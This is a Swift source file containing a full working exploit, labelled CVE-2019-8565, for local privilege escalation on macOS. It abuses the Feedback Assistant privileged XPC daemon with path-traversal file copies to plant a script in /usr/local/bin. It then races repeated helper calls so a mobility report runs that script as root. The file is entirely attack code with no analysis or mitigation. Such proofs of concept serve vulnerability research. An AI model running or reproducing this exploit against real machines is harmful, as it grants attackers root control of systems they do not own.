//
//  main.swift
//  cve-2019-8565
//
//  Created by gk on 2019/4/30.
//  Copyright Â© 2019 gk. All rights reserved.
//

import Foundation

@objc protocol FBAPrivilegedDaemon {
    
    func copyLogFiles(_: NSDictionary)
    func runMobilityReportWithDestination(_: NSURL)
}

if geteuid() != 0 {
    
    if ProcessInfo.processInfo.arguments.count == 3 {
        
        if let dict = NSDictionary(contentsOfFile: ProcessInfo.processInfo.arguments[1]) {
            
            let xpc_connect = NSXPCConnection(machServiceName: "com.apple.appleseed.fbahelperd", options: .privileged)
            
            xpc_connect.remoteObjectInterface = NSXPCInterface(with: FBAPrivilegedDaemon.self)
            
            xpc_connect.resume()
            
            if ProcessInfo.processInfo.arguments[2] == "1" {
                
                (xpc_connect.remoteObjectProxy as! FBAPrivilegedDaemon).copyLogFiles(dict)
            } else if ProcessInfo.processInfo.arguments[2] == "2" {
                
                (xpc_connect.remoteObjectProxy as! FBAPrivilegedDaemon).runMobilityReportWithDestination(NSURL(fileURLWithPath: "/tmp/whatever.mdsdiagnostic"))
            }
            
            var attr: posix_spawnattr_t?
            posix_spawnattr_init(&attr)
            
            var flags: Int16 = 0
            posix_spawnattr_getflags(&attr, &flags)
            flags |= Int16(POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED)
            posix_spawnattr_setflags(&attr, flags)
            
            let args = ["/System/Library/CoreServices/Applications/Feedback Assistant.app/Contents/MacOS/Feedback Assistant"]
            let argv: [UnsafeMutablePointer<CChar>?] = args.map{ $0.withCString(strdup) }
            
            defer {
                
                for case let arg? in argv {
                    
                    free(arg)
                }
            }
            
            posix_spawn(nil, argv[0], nil, &attr, argv + [nil], nil)
        }
        
        exit(0)
    }
    
    let path = NSTemporaryDirectory() + ProcessInfo.processInfo.globallyUniqueString
    
    try? FileManager.default.removeItem(atPath: path)
    
    try? FileManager.default.createDirectory(atPath: path + "/bin", withIntermediateDirectories: true, attributes: nil)
    
    var trigger: String!
    
    if let mobility_info = try? NSString(contentsOfFile: "/System/Library/Frameworks/SystemConfiguration.framework/Versions/A/Resources/get-mobility-info", encoding: String.Encoding.utf8.rawValue) {
        
        if let regex = try? NSRegularExpression(pattern: "if \\[ -x /usr/local/bin/(\\w+)", options: .caseInsensitive) {
            
            if let match = regex.firstMatch(in: mobility_info as String, options: [], range: NSMakeRange(0, mobility_info.length)) {
                
                trigger = mobility_info.substring(with: match.range(at: 1))
                
                let shell = String(format: "#!/bin/sh\n%@\n/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal\nrm -- \"$0\"\n", Bundle.main.executablePath!)
                
                try? shell.write(toFile: path + "/bin/" + trigger, atomically: false, encoding: .utf8)
                
                var isDir: ObjCBool = ObjCBool(false)
                //source dest
                var dict: NSDictionary!
                
                if FileManager.default.fileExists(atPath: "/usr/local/bin", isDirectory: &isDir) && isDir.boolValue {
                    
                    dict = NSDictionary(dictionary: ["/var/log/../../.." + path + "/bin/" + trigger: "/tmp/../.." + "/usr/local/bin/" + trigger])
                } else {
                    
                    dict = NSDictionary(dictionary: ["/var/log/../../.." + path + "/bin": "/tmp/../.." + "/usr/local/bin"])
                }
                
                dict.write(toFile: path + "/task.plist", atomically: false)
            }
        }
    }
    
    var procs = [Process]()
    
    for _ in 0 ..< 16 {
        
        procs.append(Process.launchedProcess(launchPath: Bundle.main.executablePath!, arguments: [path + "/task.plist", "1"]))
    }
    
    var cnt = 0
    var ts = timespec(tv_sec: 0, tv_nsec: 500 * 1000000)
    
    while access("/usr/local/bin/" + trigger, F_OK) == -1 {
        
        nanosleep(&ts, nil)
        cnt += 1
        
        if cnt > 4 {
            
            for i in 0 ..< 16 {
                
                procs[i].terminate()
            }
            
            exit(0)
        }
    }
    
    print("stage 1 ok!\n")
    
    try? FileManager.default.setAttributes([.posixPermissions : 0o777], ofItemAtPath: "/usr/local/bin/" + trigger)
    
    let sema = DispatchSemaphore(value: 0)
    
    var token: Int32 = 0
    
    notify_register_dispatch("root.me.ok", &token, DispatchQueue.global()) { (token: Int32) in
        
        sema.signal()
        
        notify_cancel(token)
    }
    
    procs.removeAll()
    
    for _ in 0 ..< 16 {
        
        procs.append(Process.launchedProcess(launchPath: Bundle.main.executablePath!, arguments: [path + "/task.plist", "2"]))
    }
    
    if sema.wait(timeout: DispatchTime.now() + .seconds(2)) == .success {
        
        print("stage 2 ok!\n")
    }
    
    for i in 0 ..< 16 {
        
        procs[i].terminate()
    }
} else {

    notify_post("root.me.ok")
}





